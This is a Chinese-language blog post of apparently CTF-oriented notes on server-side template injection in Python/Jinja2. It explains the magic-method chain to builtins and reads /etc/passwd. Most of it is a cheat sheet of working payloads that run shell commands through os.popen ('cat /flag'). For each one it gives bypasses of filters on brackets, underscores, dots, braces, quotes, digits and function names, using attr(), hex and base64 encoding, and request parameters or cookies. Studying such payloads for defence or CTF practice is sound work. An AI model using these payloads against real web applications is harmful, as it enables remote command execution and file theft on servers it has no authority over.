# SSTI注入篇


# SSTI 漏洞成因

ssti 服务端模板注入成因为：web 应用在使用框架（如 python 的 flask、jinjia2、django；java 的 freemarker、velocity；php 的 thinkphp、smarty 等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。

# SSTI 中常用魔术方法

- \_\_class\_\_ 返回一个实例所属的类
- \_\_mro\_\_ 查看类继承的所有父类，直到 object
- \_\_subclasses\_\_() 获取一个类的子类，返回的是一个列表
- \_\_bases\_\_ 以元组形式返回一个类直接继承的类
- \_\_init\_\_ 类实例创建之后调用，对当前对象的实例的初始化
- \_\_globals\_\_ 使用方式为**函数名**\.\_\_globals\_\_，返回一个当前空间下能使用的模块、方法和变量的字典
- \_\_getattribute\_\_ 当类被调用时，无条件进入此函数
- \_\_getattr\_\_ 访问对象中不存在的属性时调用
- \_\_dict\_\_ 返回所有属性，包括属性、方法等
- \_\_builtins\_\_ 查看当前所有导入的内建函数

# 攻击思路

- ## 获取基本类

```
dict //返回类中的函数和属性，父类子类互不影响
base //返回类的父类 python3
mro //返回类继承的元组，(寻找父类) python3
init //返回类的初始化方法  
subclasses() //返回类中仍然可用的引用 python3
globals //对包含函数全局变量的字典的引用 python3

对于返回的是类实例的话:
class //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法
```

```
''.__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
```

- ## 获取基本类后，继续获取基本类的子类

  ```
  object.subclasses()
  ```

- ## 找\_\_init\_\_类

  ```
  ''.__class__.__mro__[2].__subclasses__()[99].__init__
  ```

- ## 查看其引用\_\_builtins\_\_

  ```
  ''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']
  ```

- ## 寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能

```
''.__class__.__mro[2].subclasses()[138].init.globals['builtins']['file']('/etc/passwd').read()
```

# 常用目标函数

```
file、subprocess.Popen、os.popen、exec、eval
```

# 绕过过滤方法

- ## 过滤中括号

  魔术方法\_\_getitem\_\_可替代中括号

  ```
  当中括号被过滤时，如下将被限制访问:
  {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}}

  可用__getitem__替换中括号[]:
  {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}}
  ```

- ## 过滤下划线

  ```
  原 payload 被限制:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}

  1.使用 attr()绕过，payload:
  {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }}
  同时 get 方法传参?a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__

  2.将下划线进行编码绕过，payload:
  {{ ().['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[xx]['\x5f\x5finit\x5f\x5f'].['\x5f\x5fglobals\x5f\x5f']['popen']('cat /flag') }}
  ```

- ## 过滤点

  ```
  原 payload 被限制:
  {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}

  1.使用 attr()绕过，payload:
  {{ () | attr('__class__') | attr('__base__') | attr('__subclasses__')() | attr('__getitem__')(xx) | attr('__init__') | attr('__globals__') | attr('__getitem__')('popen')('cat /flag') | attr('read')()}}

  2. 使用中括号绕过，payload:
     {{ ()['__class__']['__base__']['__subclasses__']()[xx]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
  ```

- ## 过滤大括号

  使用\{\%\%\}替代\{\{\}\}，payload:

  \{\% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) \%\}

- ## 过滤引号

  ```
  当'被过滤后以下访问将被限制
  {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}

  1.通过 request.args 的 get 传参输入引号内的内容，payload：
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[request.args.popen](request.args.cmd).read() }}
  同时 get 传参?popen=popen&cmd=cat /flag

  2.通过 request.form 的 post 传参输入引号内的内容，payload：
  {{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read() }}
  同时 post 传参?popen=popen&cmd=cat /flag

  3.使用 cookies 传参，如 request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag
  ```

- ## 过滤数字

  ```
  使用过滤器 length 绕过
  {% set a='aaa' | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}}
  ```

- ## 过滤函数名

  ```
  1.使用拼接绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }}
  
  2.16进制编码绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\x70\x6f\x70\x65\x6e']('cat /flag').read() }}
  
  3.base64编码绕过，payload:
  {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }}
  ```


---

> 作者: Hinoatari  
> URL: http://localhost:1313/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/  

